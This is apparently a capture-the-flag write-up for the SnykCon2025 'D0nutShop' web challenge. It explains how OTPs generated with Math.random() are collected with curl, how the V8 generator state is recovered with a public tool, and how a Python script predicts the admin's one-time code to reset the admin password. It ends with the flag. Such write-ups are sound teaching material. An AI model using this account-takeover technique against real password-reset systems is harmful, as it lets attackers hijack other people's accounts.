# D0nutShop
![image](https://github.com/user-attachments/assets/b9c7c3c3-ec17-44c9-97a3-ae2a3ed99147)

Attachment: [challenge.zip](https://github.com/LazyTitan33/CTF-Writeups/raw/refs/heads/main/SnykCon2025/attachments/donutshop.zip)

## Writeup

In the challenge description and on the website there are multiple references to this piece of source code:  

```javascript
const CONST = 10000000;
const otpStore = {};

function generateOtp(username) {
    const otp = Math.floor(CONST * Math.random());
    otpStore[username] = otp;
    return otp;
}

function verifyOtp(username, otp) {
    if (otpStore[username] && parseInt(otp) === otpStore[username]) {
        delete otpStore[username];
        return true;
    }
    return false;
}

module.exports = { generateOtp, verifyOtp };
```

Using `Math.random()` is [not](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/random) considered cryptographically secure.

Doing some research on it on github, using the mention of the d0nut user and the `Math.floor(CONST * Math.random());` line allows me to find this repo: https://github.com/d0nutptr/v8_rand_buster

Using these requests a few times, allows me to collect a bunch of OTP codes:  

```bash
curl -s -X POST http://challenge.ctf.games:32681/reset -d 'username=d0nut' 1>/dev/null
curl -s -X POST http://challenge.ctf.games:32681/reset/api/get-otp -H 'Content-Type: application/json' -d '{"username":"d0nut","password":"d0nutboi"}'
```

![image](https://github.com/user-attachments/assets/c84ec8d3-dda9-434d-b4b8-495429b04f0c)

With about 6 codes in the bag, I follow the instructions in the repo and successfully generate a seed:  

```bash
 cat codes|tac |python v8_rand_buster/xs128p.py --multiple 10000000 --lead 6
```

![image](https://github.com/user-attachments/assets/a99230eb-2881-4c59-9d49-77aacc0de3aa)

I then create additional OTPs:  

```bash
python v8_rand_buster/xs128p.py --multiple 10000000 --gen 12319565152643240056,14401482273704469689,7
```

For troubleshooting I wrote this script to perform the reset, verify and then change the admin password:

```python
#!/usr/bin/python

import requests, json

base_url = 'challenge.ctf.games:32393'
reset_url = f'http://{base_url}/reset'
verify_url = f'http://{base_url}/reset/verify'
change_password = f'http://{base_url}/reset/change-password'

header = {'Content-Type':'application/x-www-form-urlencoded'}

reset_data = 'username=admin'
new_password = 'newPassword=lazytitan'

requests.post(reset_url, data=reset_data, headers=header)

verify_data = f'username=admin&otp=3974566'
r = requests.post(verify_url, data=verify_data, headers=header)

if 'verified' in r.text:
    verified_cookie = r.cookies.get('connect.sid')
    r = requests.post(change_password, headers=header, cookies={'connect.sid': verified_cookie}, data=new_password)
    
    if 'successfully' in r.text:
        print('admin password changed')
```

I login as admin and get the flag:  

![image](https://github.com/user-attachments/assets/e4046a42-f6fd-4876-9f9c-1bd00ff86ba0)

flag{9edab280dafea57fa1deea3b7a9885f3}



